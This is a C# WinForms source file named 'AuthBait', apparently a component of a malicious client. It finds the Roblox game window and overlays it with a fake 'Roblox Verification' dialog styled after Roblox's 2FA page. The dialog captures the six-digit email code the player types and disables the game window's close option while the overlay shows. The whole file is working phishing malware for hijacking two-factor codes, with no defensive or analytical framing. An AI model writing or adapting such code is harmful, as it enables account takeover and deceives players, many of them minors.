// AuthBait — pure C# in-process overlay
// WinForms frameless topmost window drawn with GDI+
// Follows the Roblox game window; captures typed verification code
// via an in-process callback — zero external process, zero Python.

using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PureAIO.Client.AuthBait
{
    // ── Result ────────────────────────────────────────────────────────────────
    public class OverlayResult
    {
        public bool   Success;
        public string Code;
        public string Error;
    }

    // ── Main overlay window ───────────────────────────────────────────────────
    public sealed class AuthBaitOverlay : Form
    {
        // ── Win32 ─────────────────────────────────────────────────────────────
        [DllImport("user32.dll")] static extern bool EnumWindows(EnumWindowsProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr h, out uint pid);
        [DllImport("user32.dll")] static extern IntPtr FindWindow(string cls, string title);
        [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr h, IntPtr after, int x, int y, int w, int ht, uint flags);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr h);
        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h, int cmd);
        [DllImport("user32.dll")] static extern IntPtr SendMessage(IntPtr h, uint msg, IntPtr wP, IntPtr lP);
        [DllImport("user32.dll")] static extern IntPtr GetSystemMenu(IntPtr h, bool revert);
        [DllImport("user32.dll")] static extern bool EnableMenuItem(IntPtr hMenu, uint id, uint flags);
        [DllImport("user32.dll")] static extern int GetWindowText(IntPtr h, StringBuilder sb, int max);
        [DllImport("user32.dll")] static extern int GetClassName(IntPtr h, StringBuilder sb, int max);
        [DllImport("user32.dll")] static extern bool SetLayeredWindowAttributes(IntPtr h, uint crKey, byte alpha, uint flags);

        delegate bool EnumWindowsProc(IntPtr h, IntPtr lp);

        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int L, T, R, B; }

        const uint SWP_NOMOVE      = 0x0002;
        const uint SWP_NOSIZE      = 0x0001;
        const uint SWP_NOACTIVATE  = 0x0010;
        const uint SWP_SHOWWINDOW  = 0x0040;
        const uint WS_EX_LAYERED   = 0x00080000;
        const uint LWA_ALPHA       = 0x00000002;
        const uint SC_CLOSE        = 0xF060;
        const uint MF_GRAYED       = 0x00000001;
        const uint MF_BYCOMMAND    = 0x00000000;

        // ── State ─────────────────────────────────────────────────────────────
        private IntPtr        _robloxHwnd   = IntPtr.Zero;
        private System.Windows.Forms.Timer _trackTimer;
        private System.Windows.Forms.Timer _searchTimer;

        private string        _enteredCode  = "";
        private bool          _codeSubmitted;
        private bool          _showInvalid;

        private readonly ManualResetEventSlim _done = new ManualResetEventSlim(false);
        public  OverlayResult Result { get; private set; }

        // ── UI controls ───────────────────────────────────────────────────────
        private Panel  _panel;        // centred card
        private Label  _lblTitle;
        private Label  _lblBody;
        private Label  _lblInput;     // the typed digits
        private Label  _lblError;     // "Incorrect code" feedback
        private Button _btnVerify;
        private Button _btnCancel;

        // ── Colour palette (mimics Roblox 2FA page) ───────────────────────────
        static readonly Color BgOverlay  = Color.FromArgb(210, 15, 15, 15);
        static readonly Color CardBg     = Color.FromArgb(255, 30, 30, 32);
        static readonly Color CardBorder = Color.FromArgb(255, 68, 68, 68);
        static readonly Color AccentBlue = Color.FromArgb(255, 0, 162, 255);
        static readonly Color TextMain   = Color.White;
        static readonly Color TextSub    = Color.FromArgb(255, 170, 170, 170);
        static readonly Color InputBg    = Color.FromArgb(255, 50, 50, 55);
        static readonly Color ErrorRed   = Color.FromArgb(255, 255, 80, 80);
        static readonly Color BtnDisable = Color.FromArgb(255, 60, 60, 65);

        // ── Constructor ───────────────────────────────────────────────────────
        public AuthBaitOverlay()
        {
            FormBorderStyle = FormBorderStyle.None;
            TopMost         = true;
            ShowInTaskbar   = false;
            BackColor       = Color.FromArgb(15, 15, 15);
            Opacity         = 0.93;
            DoubleBuffered  = true;

            // Make the outer transparent overlay layer pass through clicks
            // (clicks only land on _panel which is opaque)
            ExStyle |= WS_EX_LAYERED;

            BuildUI();
            HookKeyboard();

            _searchTimer = new System.Windows.Forms.Timer { Interval = 800 };
            _searchTimer.Tick += (s, e) => SearchRoblox();
            _searchTimer.Start();

            _trackTimer = new System.Windows.Forms.Timer { Interval = 60 };
            _trackTimer.Tick += (s, e) => TrackRobloxWindow();
        }

        // Extended window style helper
        private uint ExStyle
        {
            get  => (uint)GetWindowLong(Handle, -20);
            set  => SetWindowLong(Handle, -20, (int)value);
        }
        [DllImport("user32.dll")] static extern int  GetWindowLong(IntPtr h, int i);
        [DllImport("user32.dll")] static extern int  SetWindowLong(IntPtr h, int i, int v);

        // ── UI build ──────────────────────────────────────────────────────────
        private void BuildUI()
        {
            // Semi-transparent click-through overlay fill
            Paint += (s, e) =>
            {
                using var br = new SolidBrush(BgOverlay);
                e.Graphics.FillRectangle(br, ClientRectangle);
            };

            // Card
            _panel = new Panel
            {
                Size      = new Size(380, 310),
                BackColor = CardBg,
            };
            _panel.Paint += PaintCard;

            // Logo / title
            _lblTitle = new Label
            {
                Text      = "Roblox Verification",
                ForeColor = TextMain,
                Font      = new Font("Segoe UI", 15f, FontStyle.Bold),
                AutoSize  = true,
                Location  = new Point(20, 28),
            };

            // Body text
            _lblBody = new Label
            {
                Text      = "Enter the 6-digit code sent to your\nemail to continue playing.",
                ForeColor = TextSub,
                Font      = new Font("Segoe UI", 9.5f),
                AutoSize  = false,
                Size      = new Size(340, 40),
                Location  = new Point(20, 68),
            };

            // Input box display
            _lblInput = new Label
            {
                Text      = "______",
                ForeColor = TextMain,
                BackColor = InputBg,
                Font      = new Font("Consolas", 22f, FontStyle.Bold),
                TextAlign = ContentAlignment.MiddleCenter,
                Size      = new Size(340, 54),
                Location  = new Point(20, 120),
                BorderStyle = BorderStyle.FixedSingle,
            };

            // Error label
            _lblError = new Label
            {
                Text      = "Incorrect code. Please try again.",
                ForeColor = ErrorRed,
                Font      = new Font("Segoe UI", 8.5f),
                AutoSize  = true,
                Location  = new Point(20, 182),
                Visible   = false,
            };

            // Verify button
            _btnVerify = new Button
            {
                Text      = "Verify",
                Size      = new Size(160, 38),
                Location  = new Point(20, 210),
                FlatStyle = FlatStyle.Flat,
                BackColor = AccentBlue,
                ForeColor = TextMain,
                Font      = new Font("Segoe UI", 10f, FontStyle.Bold),
                Enabled   = false,
            };
            _btnVerify.FlatAppearance.BorderSize = 0;
            _btnVerify.Click += (s, e) => SubmitCode();

            // Cancel/close
            _btnCancel = new Button
            {
                Text      = "Cancel",
                Size      = new Size(155, 38),
                Location  = new Point(205, 210),
                FlatStyle = FlatStyle.Flat,
                BackColor = BtnDisable,
                ForeColor = TextSub,
                Font      = new Font("Segoe UI", 10f),
            };
            _btnCancel.FlatAppearance.BorderSize = 0;
            _btnCancel.Click += (s, e) => Finish(false, null, "User cancelled");

            _panel.Controls.AddRange(new Control[]
            {
                _lblTitle, _lblBody, _lblInput, _lblError, _btnVerify, _btnCancel
            });

            Controls.Add(_panel);
        }

        private void PaintCard(object sender, PaintEventArgs e)
        {
            var g   = e.Graphics;
            var rc  = _panel.ClientRectangle;
            g.SmoothingMode = SmoothingMode.AntiAlias;
            using var pen   = new Pen(CardBorder, 1f);
            g.DrawRectangle(pen, 0, 0, rc.Width - 1, rc.Height - 1);

            // Top accent bar
            using var br = new SolidBrush(AccentBlue);
            g.FillRectangle(br, 0, 0, rc.Width, 4);
        }

        // ── Keyboard hook (in-process, no global hook needed) ─────────────────
        private void HookKeyboard()
        {
            // Route key events from child controls up to the form
            foreach (Control c in _panel.Controls)
                c.KeyDown  += OnKeyDown;
            _panel.KeyDown += OnKeyDown;
            KeyDown        += OnKeyDown;
            KeyPreview      = true;
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            HandleKey(keyData);
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void OnKeyDown(object s, KeyEventArgs e)
        {
            HandleKey(e.KeyCode);
            e.Handled = true;
        }

        private void HandleKey(Keys k)
        {
            if (_codeSubmitted) return;

            if (k == Keys.Back && _enteredCode.Length > 0)
            {
                _enteredCode = _enteredCode.Substring(0, _enteredCode.Length - 1);
            }
            else if (k == Keys.Enter && _enteredCode.Length == 6)
            {
                SubmitCode();
                return;
            }
            else if (k >= Keys.D0 && k <= Keys.D9 && _enteredCode.Length < 6)
            {
                _enteredCode += (char)('0' + (k - Keys.D0));
            }
            else if (k >= Keys.NumPad0 && k <= Keys.NumPad9 && _enteredCode.Length < 6)
            {
                _enteredCode += (char)('0' + (k - Keys.NumPad0));
            }

            UpdateInputDisplay();
        }

        private void UpdateInputDisplay()
        {
            if (_lblInput.InvokeRequired) { _lblInput.Invoke(new Action(UpdateInputDisplay)); return; }

            var display = _enteredCode.PadRight(6, '_');
            _lblInput.Text     = display;
            _btnVerify.Enabled = _enteredCode.Length == 6;

            if (_showInvalid && _enteredCode.Length > 0)
            {
                _showInvalid       = false;
                _lblError.Visible  = false;
            }
        }

        private void SubmitCode()
        {
            if (_enteredCode.Length < 6) return;
            _codeSubmitted = true;
            Finish(true, _enteredCode, null);
        }

        // ── Window tracking ───────────────────────────────────────────────────
        private void SearchRoblox()
        {
            if (_robloxHwnd != IntPtr.Zero) return;

            var found = IntPtr.Zero;
            EnumWindows((h, _) =>
            {
                var sb = new StringBuilder(256);
                GetWindowText(h, sb, 256);
                if (!IsWindowVisible(h)) return true;
                if (sb.ToString().IndexOf("Roblox", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    found = h;
                    return false;
                }
                return true;
            }, IntPtr.Zero);

            if (found == IntPtr.Zero) return;

            _robloxHwnd = found;
            _searchTimer.Stop();

            DisableRobloxClose();
            TrackRobloxWindow();
            _trackTimer.Start();
            Show();
            SetForegroundWindow(Handle);
        }

        private void TrackRobloxWindow()
        {
            if (_robloxHwnd == IntPtr.Zero) return;
            if (!IsWindowVisible(_robloxHwnd))
            {
                _robloxHwnd = IntPtr.Zero;
                _trackTimer.Stop();
                _searchTimer.Start();
                return;
            }

            if (!GetWindowRect(_robloxHwnd, out var rc)) return;

            var w  = rc.R - rc.L;
            var h  = rc.B - rc.T;

            // Cover the Roblox window exactly
            SetWindowPos(Handle, (IntPtr)(-1), rc.L, rc.T, w, h,
                         SWP_SHOWWINDOW | SWP_NOACTIVATE);

            // Centre the card
            _panel.Location = new Point((w - _panel.Width) / 2, (h - _panel.Height) / 2);
        }

        private void DisableRobloxClose()
        {
            if (_robloxHwnd == IntPtr.Zero) return;
            var sysMenu = GetSystemMenu(_robloxHwnd, false);
            if (sysMenu == IntPtr.Zero) return;
            EnableMenuItem(sysMenu, SC_CLOSE, MF_BYCOMMAND | MF_GRAYED);
        }

        // ── Finish / result ───────────────────────────────────────────────────
        private void Finish(bool success, string code, string error)
        {
            Result = new OverlayResult { Success = success, Code = code, Error = error };

            // Re-enable Roblox close if we can
            if (_robloxHwnd != IntPtr.Zero)
            {
                var sysMenu = GetSystemMenu(_robloxHwnd, false);
                if (sysMenu != IntPtr.Zero)
                    EnableMenuItem(sysMenu, SC_CLOSE, MF_BYCOMMAND);
            }

            _done.Set();

            if (InvokeRequired) Invoke(new Action(Close));
            else Close();
        }

        // ── Public entry point ────────────────────────────────────────────────
        /// <summary>
        /// Run the overlay on a fresh STA thread; blocks until code is captured
        /// or the timeout elapses.
        /// </summary>
        public static OverlayResult RunBlocking(int timeoutMs = 180_000)
        {
            OverlayResult result = null;
            var thread = new Thread(() =>
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);

                using var ov = new AuthBaitOverlay();
                Application.Run(ov);
                result = ov.Result;
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.IsBackground = true;
            thread.Start();
            thread.Join(timeoutMs);

            if (result == null)
                return new OverlayResult { Success = false, Error = "Timeout" };

            return result;
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _trackTimer?.Stop();
            _searchTimer?.Stop();
            base.OnFormClosed(e);
        }
    }
}
